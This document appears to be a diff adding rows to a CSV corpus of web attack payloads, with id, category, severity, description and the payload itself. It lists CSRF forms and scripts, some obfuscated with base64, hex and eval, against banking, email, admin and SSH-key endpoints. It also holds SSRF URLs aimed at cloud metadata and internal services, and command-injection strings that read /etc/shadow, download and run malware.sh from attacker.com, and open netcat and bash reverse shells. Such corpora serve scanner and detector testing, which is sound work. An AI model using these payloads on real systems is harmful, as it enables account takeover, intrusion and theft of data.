+csrf-041,CSRF,CSRF,high,Malicious webpage,389530314746,"<script>var img=new Image();img.onload=function(){fetch('https://target.com/api/action',{method:'POST',credentials:'include'});};img.src='https://target.com/api/trigger';</script>"
+csrf-042,CSRF,CSRF,high,Malicious webpage,753a6750fadb,"<form action='https://target.com/api/first' method='POST' id='f1'><input type='hidden' name='step' value='1'/></form><form action='https://target.com/api/second' method='POST' id='f2'><input type='hidden' name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2500);</script>"
+csrf-043,CSRF,CSRF,high,Malicious webpage,d0636898a0ee,"<script>fetch('https://target.com/api/custom',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({cmd:'run'})});</script>"
+csrf-044,CSRF,CSRF,high,Malicious webpage,a636b05c44d9,"<form action='https://target.com/api/modify' method='POST' onsubmit='this.token.value=""hacked""'><input type='hidden' name='token' value='original'/></form><script>document.forms[0].submit();</script>"
+csrf-045,CSRF,CSRF,high,Malicious webpage,41d369f85603,"<img src='nonexistent.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/like',true);xhr.withCredentials=true;xhr.send('post=999');"">"
+csrf-046,CSRF,CSRF,medium,Malicious webpage,913ec9f7ae65,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=vip'/>
+csrf-047,CSRF,CSRF,critical,Malicious webpage,33715066d4ef,"<script>setTimeout(()=>{var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},2000);</script>"
+csrf-048,CSRF,CSRF,high,Malicious webpage,fae315d0aba7,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({delete:true})});</script>"
+csrf-049,CSRF,CSRF,high,Malicious webpage,d7e1e872555c,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),3000);</script>"
+csrf-051,CSRF,CSRF,critical,Admin panel user management,24e33a8cbec8,<form action='https://example.com/admin/add-user' method='POST' id='f'><input name='username' value='eviladmin'/><input name='role' value='admin'/></form><script>document.getElementById('f').submit();</script>
+csrf-052,CSRF,CSRF,medium,Email service user settings,5e8bb3bd17f2,<form action='https://mail.example.com/settings/notifications' method='POST' id='f'><input name='email_alerts' value='off'/></form><script>document.getElementById('f').submit();</script>
+csrf-053,CSRF,CSRF,high,Security 2FA reset endpoint,d7bf8bc728e4,<img src='https://secure.example.com/2fa/reset?user=target' style='display:none'/>
+csrf-054,CSRF,CSRF,medium,Streaming service subscription,3d473f4b81e9,<meta http-equiv='refresh' content='0;url=https://streaming.example.com/subscribe?plan=premium'/>
+csrf-055,CSRF,CSRF,high,E-commerce user profile,48a38c494092,<form action='https://shop.example.com/account/address' method='POST' id='f'><input name='address' value='123 Evil St'/></form><script>document.getElementById('f').submit();</script>
+csrf-056,CSRF,CSRF,medium,Social media friend management,f8de91adaea8,<form action='https://social.example.com/friends/add' method='POST' id='f'><input name='friend_id' value='attacker'/></form><script>document.getElementById('f').submit();</script>
+csrf-057,CSRF,CSRF,medium,Blog comment submission,09ac356afad2,<form action='https://blog.example.com/comments' method='POST' id='f'><input name='post_id' value='123'/><textarea name='comment'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>
+csrf-058,CSRF,CSRF,medium,Social media profile update,c9c57b4c6ac1,<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>
+csrf-059,CSRF,CSRF,critical,Online banking transfer,7fb3269d1b64,<form action='https://bank.example.com/transfer' method='POST' id='f'><input name='amount' value='10000'/><input name='to_account' value='attacker'/></form><script>document.getElementById('f').submit();</script>
+csrf-060,CSRF,CSRF,high,Security settings,7fcebf2c054e,<form action='https://security.example.com/settings' method='POST' id='f'><input name='alerts' value='off'/></form><script>document.getElementById('f').submit();</script>
+csrf-061,CSRF,CSRF,critical,User account management,42d2cba81036,<form action='https://example.com/account/change-password' method='POST' id='f'><input name='new_password' value='P@ssw0rdHacked'/></form><script>document.getElementById('f').submit();</script>
+csrf-062,CSRF,CSRF,high,Continuous Integration webhook settings,ac1aacacc692,<form action='https://ci.example.com/settings/webhooks' method='POST' id='f'><input name='url' value='https://attacker.com/hook'/></form><script>document.getElementById('f').submit();</script>
+csrf-063,CSRF,CSRF,low,Calendar application settings,d961a6063aa5,<form action='https://calendar.example.com/settings' method='POST' id='f'><input name='timezone' value='UTC+14'/></form><script>document.getElementById('f').submit();</script>
+csrf-064,CSRF,CSRF,high,Email forwarding settings,9c83e9132a9b,<form action='https://mail.example.com/settings/forwarding' method='POST' id='f'><input name='forward_to' value='attacker@example.com'/></form><script>document.getElementById('f').submit();</script>
+csrf-065,CSRF,CSRF,critical,Git hosting service SSH keys,210847a6d78c,<form action='https://git.example.com/account/keys' method='POST' id='f'><textarea name='key'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...</textarea></form><script>document.getElementById('f').submit();</script>
+csrf-066,CSRF,CSRF,low,User interface settings,0d0053c88491,<form action='https://example.com/settings/language' method='POST' id='f'><input name='lang' value='xx-XX'/></form><script>document.getElementById('f').submit();</script>
+csrf-067,CSRF,CSRF,low,Newsletter subscription,622b7ed2fbf6,<form action='https://newsletter.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>
+csrf-068,CSRF,CSRF,medium,Social media posting,af831f51f416,<form action='https://twitter.com/i/tweet/create' method='POST' id='f'><textarea name='tweet'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>
+csrf-069,CSRF,CSRF,medium,SMS spam management,e70a2f816d0a,<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>
+csrf-070,CSRF,CSRF,high,Payment gateway account settings,53279ca8b153,<form action='https://payments.example.com/account/payment-method' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>
+csrf-071,CSRF,CSRF,high,Code review platform settings,695518e54afb,<form action='https://code.example.com/reviews/settings' method='POST' id='f'><input name='auto_approve' value='true'/></form><script>document.getElementById('f').submit();</script>
+csrf-072,CSRF,CSRF,high,IoT device management,06539b961bf2,<form action='https://iot.example.com/devices/add' method='POST' id='f'><input name='device_id' value='attacker_device'/></form><script>document.getElementById('f').submit();</script>
+csrf-073,CSRF,CSRF,medium,Calendar event management,22a191983dac,<form action='https://calendar.example.com/events/edit' method='POST' id='f'><input name='event_id' value='123'/><input name='title' value='Hacked Event'/></form><script>document.getElementById('f').submit();</script>
+csrf-074,CSRF,CSRF,high,Firewall management,56b511b6a176,<form action='https://firewall.example.com/blacklist/add' method='POST' id='f'><input name='ip' value='victim_ip'/></form><script>document.getElementById('f').submit();</script>
+csrf-075,CSRF,CSRF,high,DNS management,5811fb3b968c,<form action='https://dns.example.com/settings' method='POST' id='f'><input name='dns_server' value='8.8.8.8'/></form><script>document.getElementById('f').submit();</script>
+csrf-076,CSRF,CSRF,low,Mailing list subscription,35b8f5b61d11,<form action='https://mailinglist.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>
+csrf-077,CSRF,CSRF,medium,Social media profile,a0b0dbe94a29,<form action='https://social.example.com/profile/bio' method='POST' id='f'><textarea name='bio'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>
+csrf-079,CSRF,CSRF,medium,App notification settings,95b444329130,<form action='https://app.example.com/settings/notifications' method='POST' id='f'><input name='push_notifications' value='off'/></form><script>document.getElementById('f').submit();</script>
+csrf-080,CSRF,CSRF,critical,Payment gateway,ae14b43ee9c7,<form action='https://payments.example.com/account/add-card' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>
+csrf-081,CSRF,CSRF,high,Dynamic base64 decoded form submission,5576c7cdf97b,<script>var b='PGZvcm0gYWN0aW9uPSdodHRwczovL3RhcmdldC5jb20vYWN0aW9uL3VwZGF0ZScgbWV0aG9kPSdQT1NUJz48aW5wdXQgbmFtZT0nZGF0YScgdmFsdWU9J2V2aWwnPjwvaW5wdXQ+PC9mb3JtPg==';var d=atob(b);var f=document.createElement('div');f.innerHTML=d;document.body.appendChild(f);f.firstChild.submit();</script>
+csrf-082,CSRF,CSRF,high,Hex encoded script with eval,80150a2de6d0,<script>eval(unescape('%66%6f%72%6d%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%66%6f%72%6d%27%29%3b%66%6f%72%6d%2e%61%63%74%69%6f%6e%20%3d%20%27%68%74%74%70%73%3a%2f%2f%74%61%72%67%65%74%2e%63%6f%6d%2f%75%70%64%61%74%65%27%3b%66%6f%72%6d%2e%6d%65%74%68%6f%64%20%3d%20%27%50%4f%53%54%27%3b%76%61%72%20%69%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%69%6e%70%75%74%27%29%3b%69%6e%70%75%74%2e%6e%61%6d%65%20%3d%20%27%64%61%74%61%27%3b%69%6e%70%75%74%2e%76%61%6c%75%65%20%3d%20%27%65%76%69%6c%27%3b%66%6f%72%6d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%69%6e%70%75%74%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%66%6f%72%6d%29%3b%66%6f%72%6d%2e%73%75%62%6d%69%74%28%29%3b'));</script>
+csrf-083,CSRF,CSRF,high,Dynamic iframe with form,34ddd7e00481,"<script>var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/transfer"" method=""POST"" id=""f""><input name=""amount"" value=""1000""/></form><script>document.getElementById(\'f\').submit();</script>');d.close();</script>"
+csrf-084,CSRF,CSRF,high,String concatenation obfuscation,33bbe2e9954f,<script>var a='ht';var b='tps://';var c='target';var d='.com';var e='/api/evil';var f=document.createElement('form');f.action=a+b+c+d+e;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>
+csrf-085,CSRF,CSRF,medium,User interaction triggered CSRF,c4dc5dd6942d,"<form action='https://target.com/api/settings' method='POST' id='f'><input name='mode' value='stealth'/></form><div onmouseover='document.getElementById(""f"").submit()'>Hover me</div>"
+csrf-086,CSRF,CSRF,high,Delayed form submission,8b45f6a6aee6,"<script>setTimeout(function(){var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},3000);</script>"
+csrf-087,CSRF,CSRF,high,Encoded element creation,198e83555479,<script>var p=decodeURIComponent('%66%6f%72%6d');var f=document.createElement(p);f.action='https://target.com/api/update';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();</script>
+csrf-088,CSRF,CSRF,critical,Stealth iframe with postMessage,378008f1a10b,"<iframe id='f' style='display:none'></iframe><script>var i=document.getElementById('f');i.src='about:blank';i.onload=function(){var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/steal"" method=""POST"" id=""form""><input name=""data"" value=""evil""/></form>');d.close();d.getElementById('form').submit();};</script>"
+csrf-089,CSRF,CSRF,high,String split and join obfuscation,c4273e4ae4ca,<script>var s='ht'+'tp'+'s:'+'//ta'+'rget.com/api/evil';var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>
+csrf-090,CSRF,CSRF,critical,Script injection via innerHTML,800c03a6a9c6,"<div id='container'></div><script>document.getElementById('container').innerHTML='<form action=""https://target.com/api/hack"" method=""POST"" id=""f""><input name=""data"" value=""evil""/></form><script>document.getElementById(\'f\').submit();</script>';</script>"
+csrf-091,CSRF,CSRF,critical,Base64 encoded eval obfuscation,59ae757aff38,<script>eval(atob('dmFyIGY9ZG9jdW1lbnQuYWxlbWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7IGYuYWN0aW9uID0naHR0cHM6Ly90YXJnZXQuY29tL2FwaS9leGl0JztmLm1ldGhvZCA9J1BPU1QnOyB2YXIgaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7IGku bmFtZSA9J2RhdGEnOyBpLnZhbHVlID0nZXZpbCc7IGYucGFzc0NoaWxkKGlpKTsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTsgZi5zdWJtaXQoKTs='));</script>
+csrf-092,CSRF,CSRF,high,SVG embedded script,68a54d22a239,"<svg xmlns='http://www.w3.org/2000/svg'><script><![CDATA[fetch('https://target.com/api/evil',{method:'POST',body:'data=evil'})]]></script></svg>"
+csrf-093,CSRF,CSRF,medium,Meta refresh with URL encoding,1ddb0160e716,<meta http-equiv='refresh' content='0;url=https%3A%2F%2Ftarget.com%2Fapi%2Fupdate%3Fdata%3Devil'/>
+csrf-094,CSRF,CSRF,high,JavaScript URL with obfuscation,98d606f14aa4,"<a href=""javascript:(function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})()"">Click me</a>"
+csrf-095,CSRF,CSRF,high,Image onerror event trigger,ca8178732f68,"<img src='invalid.jpg' onerror=""var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();"" style='display:none'/>"
+csrf-096,CSRF,CSRF,high,Unicode escape obfuscation,b69e96363488,<script>var a=\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074;var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>
+csrf-097,CSRF,CSRF,high,CSS expression injection,26f386fd9d43,"<div style=""width:expression((function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})())""></div>"
+csrf-098,CSRF,CSRF,critical,XHR POST request,232cedbaec17,"<script>var xhr=new XMLHttpRequest();var u='https://target.com/api/evil';xhr.open('POST',u,true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('data=evil');</script>"
+csrf-099,CSRF,CSRF,medium,CSS animation event trigger,21e05cac9c3a,<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><form action='https://target.com/api/evil' method='POST' id='f' style='animation:x 1s forwards' onanimationend='this.submit()'><input name='data' value='evil'/></form>
+csrf-100,CSRF,CSRF,high,Array join obfuscation,bc59107aef30,"<script>var s=['ht','tp','s:','//','target','.com','/api','/evil'].join('');var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>"
+ssrf-001,SSRF,SSRF,high,Access internal localhost service,62fe3d14ea42,http://127.0.0.1/
+ssrf-002,SSRF,SSRF,high,Access internal network device,8d48b5cec922,http://192.168.1.1/
+ssrf-003,SSRF,SSRF,critical,AWS EC2 instance metadata,0ccb496127f4,http://169.254.169.254/latest/meta-data/
+ssrf-004,SSRF,SSRF,critical,Google Cloud metadata,f8c69287173b,http://metadata.google.internal/computeMetadata/v1/
+ssrf-005,SSRF,SSRF,critical,Azure VM metadata,796ae8c91e31,http://169.254.169.254/metadata/instance?api-version=2021-02-01
+ssrf-006,SSRF,SSRF,high,Access internal Redis,0c132b8c3ace,redis://127.0.0.1:6379
+ssrf-007,SSRF,SSRF,high,Access internal Memcached,de1b6ca8dc83,memcached://127.0.0.1:11211
+ssrf-008,SSRF,SSRF,medium,Access internal FTP,bfe654ddc625,ftp://127.0.0.1/
+ssrf-009,SSRF,SSRF,high,Access internal SMB share,2fd035c88018,smb://192.168.1.100/share
+ssrf-010,SSRF,SSRF,critical,Access Docker API,8a1c379f5b04,http://127.0.0.1:2375/containers/json
+ssrf-011,SSRF,SSRF,critical,Access Kubernetes API,f8f779d5d4b5,https://kubernetes.default.svc/api
+ssrf-012,SSRF,SSRF,high,Access Jenkins API,97693c4ef422,http://127.0.0.1:8080/api/json
+ssrf-013,SSRF,SSRF,high,Access Elasticsearch,d71b8f9e7c11,http://127.0.0.1:9200/_cat/indices?v
+ssrf-014,SSRF,SSRF,high,Access RabbitMQ API,b594334c1baa,http://127.0.0.1:15672/api/overview
+ssrf-015,SSRF,SSRF,high,Access MySQL service,356e8478166d,mysql://127.0.0.1:3306
+ssrf-016,SSRF,SSRF,high,Access PostgreSQL service,d02b5d638f4c,postgresql://127.0.0.1:5432
+ssrf-017,SSRF,SSRF,medium,Access SMTP server,2450835d1da6,smtp://127.0.0.1:25
+ssrf-018,SSRF,SSRF,medium,Access SNMP service,000b2aa09110,snmp://127.0.0.1
+ssrf-019,SSRF,SSRF,high,Access LDAP service,085bd1b27a25,ldap://127.0.0.1:389
+ssrf-020,SSRF,SSRF,critical,Attempt path traversal via SSRF,938674c1f82d,http://127.0.0.1/../../../../etc/passwd
+ssrf-021,SSRF,SSRF,high,URL encoded internal IP,9bad7fee4158,http://%31%39%32.%31%36%38.%31.%31/
+ssrf-022,SSRF,SSRF,high,Octal encoded IP address,518dea0c82da,http://0300.0250.0001.0001/
+ssrf-023,SSRF,SSRF,high,Decimal encoded IP address,f61cb43c10b4,http://3232235777/
+ssrf-024,SSRF,SSRF,high,IPv6 localhost,7b94047a04f1,http://[::1]/
+ssrf-025,SSRF,SSRF,critical,Local file read attempt,859bc9ce6ccf,file:///etc/passwd
+ssrf-026,SSRF,SSRF,critical,Gopher protocol to Redis,dfdd93482255,gopher://127.0.0.1:6379/_SET%20key%201%0D%0A
+ssrf-027,SSRF,SSRF,medium,Data URI with embedded script,13f2a258354a,"data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRiBFeHBlcmltZW50Jyk8L3NjcmlwdD4="
+ssrf-028,SSRF,SSRF,low,JavaScript URI scheme,796a98e66cd9,javascript:alert('SSRF')
+ssrf-029,SSRF,SSRF,critical,Access process environment,431c7b6b2994,file:///proc/self/environ
+ssrf-030,SSRF,SSRF,critical,Nested URL encoded path traversal,72566526b494,http://%31%32%37.%30.%30.%31%2F%2E%2E%2F%2E%2E%2Fetc/passwd
+ssrf-031,SSRF,SSRF,critical,FTP directory traversal,d614dff071e5,ftp://127.0.0.1/../../../../etc/passwd
+ssrf-032,SSRF,SSRF,critical,SMB UNC path traversal,ccf474e317bb,smb://127.0.0.1/../../../../Windows/System32/drivers/etc/hosts
+ssrf-033,SSRF,SSRF,critical,HTTP request smuggling,75ff28e44c99,http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
+ssrf-034,SSRF,SSRF,critical,HTTP header injection,4aa3696444ec,"http://127.0.0.1:80/
+X-Injected-Header: evil"
+ssrf-035,SSRF,SSRF,high,Basic auth credentials,4a4e8179f0e0,http://admin:password@127.0.0.1/admin
+ssrf-036,SSRF,SSRF,high,Redirect to internal IP,6c22c177996b,http://external.com/redirect?url=http://127.0.0.1/
+ssrf-037,SSRF,SSRF,critical,DNS rebinding to internal IP,6c289c319f49,http://evil.com/
+ssrf-038,SSRF,SSRF,high,IPv4 mapped IPv6,f6b0c0ebfa4f,http://[::ffff:127.0.0.1]/
+ssrf-039,SSRF,SSRF,medium,Encoded newline injection,84fb97637f5e,http://127.0.0.1/%0a%0d
+ssrf-040,SSRF,SSRF,medium,Method override parameter,2750f61f3651,http://127.0.0.1/?_method=POST
+ssrf-041,SSRF,SSRF,medium,Chunked transfer encoding test,0aceb6cec5e5,http://127.0.0.1/chunked
+ssrf-042,SSRF,SSRF,medium,HTTP TRACE method test,6341b598d178,http://127.0.0.1/trace
+ssrf-043,SSRF,SSRF,medium,HTTP OPTIONS method test,612fdea3de13,http://127.0.0.1/options
+ssrf-044,SSRF,SSRF,medium,HTTP CONNECT method test,2c2d82a397d7,http://127.0.0.1/connect
+ssrf-045,SSRF,SSRF,medium,HTTP PATCH method test,9314eba0699a,http://127.0.0.1/patch
+ssrf-046,SSRF,SSRF,medium,HTTP DELETE method test,16b4155740fa,http://127.0.0.1/delete
+ssrf-047,SSRF,SSRF,medium,HTTP PUT method test,69b52c3c771a,http://127.0.0.1/put
+ssrf-049,SSRF,SSRF,high,Inject X-Forwarded-For header,2cf0c00f6820,"http://127.0.0.1/
+X-Forwarded-For: 127.0.0.1"
+ssrf-050,SSRF,SSRF,high,Userinfo section in URL,742ab006740c,http://127.0.0.1@evil.com/
+ssrf-051,SSRF,SSRF,medium,Access internal dictionary service,a5f70a213be4,dict://127.0.0.1/
+ssrf-052,SSRF,SSRF,medium,Access internal telnet service,ccec8fc49e2b,telnet://127.0.0.1:23
+ssrf-053,SSRF,SSRF,high,LDAP query,fb6a5c0e38e6,"ldap://127.0.0.1:389/ou=users,dc=example,dc=com?uid"
+ssrf-054,SSRF,SSRF,medium,Access internal RDP service,9743c6c32741,rdp://127.0.0.1:3389
+ssrf-055,SSRF,SSRF,high,Access SMB share,c03ec07b8842,smb://127.0.0.1/share
+ssrf-056,SSRF,SSRF,medium,Access NFS export,f7768a36543e,nfs://127.0.0.1/export
+ssrf-057,SSRF,SSRF,medium,Access IMAP mail server,970919f0ec61,imap://127.0.0.1:143
+ssrf-058,SSRF,SSRF,medium,Access POP3 mail server,c64dc6992b92,pop3://127.0.0.1:110
+ssrf-059,SSRF,SSRF,medium,Access MQTT broker,a774abdc613f,mqtt://127.0.0.1:1883
+ssrf-060,SSRF,SSRF,medium,Access WebSocket service,d36841f5d00b,ws://127.0.0.1:8080/
+ssrf-061,SSRF,SSRF,medium,Access secure WebSocket service,175bc5eb15bb,wss://127.0.0.1:8443/
+ssrf-062,SSRF,SSRF,low,Bitcoin protocol scheme,ca78a2bf0323,bitcoin://127.0.0.1/
+ssrf-063,SSRF,SSRF,low,Magnet link protocol,4bec6d1b0b11,magnet:?xt=urn:btih:abcdef1234567890
+ssrf-064,SSRF,SSRF,medium,Access SSH service,088f006225a9,ssh://127.0.0.1:22
+ssrf-065,SSRF,SSRF,low,Telephone protocol,e2cc04f5e443,tel:+1234567890
+ssrf-066,SSRF,SSRF,low,SMS protocol,43de510d9327,sms:+1234567890
+ssrf-067,SSRF,SSRF,low,Geolocation protocol,02d406a26fad,"geo:37.786971,-122.399677"
+ssrf-068,SSRF,SSRF,medium,Subversion protocol,74469a1bfbed,svn://127.0.0.1/repo
+ssrf-069,SSRF,SSRF,medium,Git protocol,67c083986f75,git://127.0.0.1/repo.git
+ssrf-070,SSRF,SSRF,medium,Secure FTP protocol,d889bcfc0543,sftp://127.0.0.1/home/user/
+ssrf-071,SSRF,SSRF,high,Double URL encoded IP,efb165297d51,http://%2531%25327%2532%253E%253E%253E/
+ssrf-072,SSRF,SSRF,medium,Mixed case HTTP scheme,62fe3d14ea42,HtTp://127.0.0.1/
+ssrf-073,SSRF,SSRF,high,Null byte injection,ae39726cc744,http://127.0.0.1%00.example.com/
+ssrf-074,SSRF,SSRF,critical,CRLF injection,dbe16bb66d83,"http://127.0.0.1/
+Set-Cookie:evil=1"
+ssrf-076,SSRF,SSRF,high,IPv6 embedded IPv4 with port,6f017e66023e,http://[::ffff:192.168.1.1]:8080/
+ssrf-078,SSRF,SSRF,critical,HTTP header injection,1163998e8f06,http://127.0.0.1/%0d%0aX-Injected-Header:evil
+ssrf-080,SSRF,SSRF,critical,File read with null byte,83b1991daf08,file:///etc/passwd%00
+ssrf-081,SSRF,SSRF,high,Basic auth with encoding,7b97d9f731b0,http://admin%3Apassword@127.0.0.1/
+ssrf-091,SSRF,SSRF,high,Hexadecimal IPv4 address,59687893da22,http://0x7f.0x0.0x0.0x1/
+ssrf-092,SSRF,SSRF,high,Shortened IPv4 address,6027c1badb94,http://127.1/
+ssrf-093,SSRF,SSRF,high,Integer IPv4 address,058658e148ad,http://2130706433/
+ssrf-095,SSRF,SSRF,low,URL fragment,f1a2dbf552a1,http://127.0.0.1/#fragment
+ssrf-096,SSRF,SSRF,low,Query parameter,9e634a51eaaa,http://127.0.0.1/?param=value
+ssrf-098,SSRF,SSRF,critical,URL encoded path traversal,96e19deada8f,http://127.0.0.1/%2e%2e/%2e%2e%2e/%2e%2e/%2e%2e/etc/passwd
+ssrf-099,SSRF,SSRF,critical,Encoded double slash,c20ffbb23e01,http://127.0.0.1/%2f%2f/etc/passwd
+ssrf-100,SSRF,SSRF,critical,Mixed encoding and case path traversal,ba4594a4f8a1,http://%31%32%37.%30.%30.%31/%2E%2E/%2e%2e/%2E%2e/etc/passwd
+cmdinj-001,CmdInj,Command Injection,high,Inject list directory command,a82ab998bb6d,; ls -la
+cmdinj-002,CmdInj,Command Injection,critical,Inject read passwd file,60394bb36bc7,&& cat /etc/passwd
+cmdinj-003,CmdInj,Command Injection,high,Inject whoami command,62ecaae15141,| whoami
+cmdinj-004,CmdInj,Command Injection,high,Inject id command using backticks,87ea5dfc8b8e,id
+cmdinj-005,CmdInj,Command Injection,high,Inject uname command,9cf74c097a4f,$(uname -a)
+cmdinj-006,CmdInj,Command Injection,high,Nested command substitution,aff5db5d5997,$(echo $(whoami))
+cmdinj-007,CmdInj,Command Injection,medium,Inject sleep command for timing attack,6eb16ef1e705,& sleep 10
+cmdinj-008,CmdInj,Command Injection,high,Inject command with newline,948d33efe864,"&& echo 'injected'
+"
+cmdinj-009,CmdInj,Command Injection,critical,Exfiltrate data via curl,5a650351cbf2,; curl http://attacker.com
+cmdinj-010,CmdInj,Command Injection,critical,Download and execute malware,aa1ed8ef8403,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh
+cmdinj-011,CmdInj,Command Injection,critical,Reverse shell via netcat,b73cfa3ec6d6,| nc attacker.com 4444 -e /bin/sh
+cmdinj-012,CmdInj,Command Injection,high,Execute whoami command,ef4957ec5768,whoami
+cmdinj-013,CmdInj,Command Injection,high,Execute id command,ef5e57fa8bef,$(id)
+cmdinj-014,CmdInj,Command Injection,medium,Simple echo injection,b75015d5f402,; echo injected
+cmdinj-015,CmdInj,Command Injection,critical,Read shadow file,ec7d3c46bb42,&& cat /etc/shadow
+cmdinj-016,CmdInj,Command Injection,high,Execute id command,714a1f2fc42f,; id
+cmdinj-017,CmdInj,Command Injection,medium,Print environment variables,2de02fe0fef8,| env
+cmdinj-018,CmdInj,Command Injection,high,List root directory,93fff531bb41,ls /
+cmdinj-019,CmdInj,Command Injection,medium,List running processes,6925954660ca,$(ps aux)
+cmdinj-020,CmdInj,Command Injection,high,Execute whoami command,694ba4ac233a,; whoami
+cmdinj-021,CmdInj,Command Injection,high,URL encoded semicolon and id command,b0fb89a6d990,%3B%20id
+cmdinj-022,CmdInj,Command Injection,high,Nested backticks execution,7f9b7878d0fd,`echo \whoami\`
+cmdinj-023,CmdInj,Command Injection,medium,Print current user environment variable,e12a7d4e275e,; echo $USER
+cmdinj-024,CmdInj,Command Injection,medium,Hex encoded space character,6af6f3b1ddc5,; echo\x20injected
+cmdinj-025,CmdInj,Command Injection,critical,Base64 encoded reverse shell,c9144bb59892,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash
+cmdinj-026,CmdInj,Command Injection,medium,Timing attack with sleep,ff19c7eee198,$(sleep 10)
+cmdinj-027,CmdInj,Command Injection,high,Nested command substitution,e3b6ed9c1cfb,; echo $(whoami)
+cmdinj-028,CmdInj,Command Injection,medium,Escape semicolon,4b43832be9a4,; echo injected\; ls
+cmdinj-029,CmdInj,Command Injection,high,Multiple command chaining,ebe48780b67d,; ls -la && whoami || echo failed
+cmdinj-030,CmdInj,Command Injection,high,Grouped commands,93efc8d78f67,; (id; uname -a)
+cmdinj-031,CmdInj,Command Injection,medium,Subshell with sleep,533f8e6949dc,; (sleep 5)
+cmdinj-032,CmdInj,Command Injection,medium,Command injection with comment,8c3d17183825,; ls -la #
+cmdinj-033,CmdInj,Command Injection,high,Nested command execution,3a8a258d4349,echo $(whoami)
+cmdinj-034,CmdInj,Command Injection,medium,Print PATH environment variable,ef41be86de21,; echo $PATH
+cmdinj-035,CmdInj,Command Injection,medium,Echo injected string,c8bab688e96b,$(echo injected)
+cmdinj-036,CmdInj,Command Injection,high,Multiple commands in subshell,c65f102b19af,; (echo injected; whoami)
+cmdinj-037,CmdInj,Command Injection,medium,Timing attack,7050692ef64e,; sleep 15
+cmdinj-040,CmdInj,Command Injection,critical,Download and execute script,152c39e36ae4,; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh
+cmdinj-042,CmdInj,Command Injection,medium,Set environment variable,928f9c3a614c,; export MALICIOUS=1
+cmdinj-043,CmdInj,Command Injection,medium,Write to file,ae9fdde0a31f,; echo 'malicious' > /tmp/malicious.txt
+cmdinj-044,CmdInj,Command Injection,medium,Change file permissions,09fc5bc3c14f,; chmod +x /tmp/m.sh
+cmdinj-045,CmdInj,Command Injection,critical,Read shadow file,f9a8b04e531b,; cat /etc/shadow
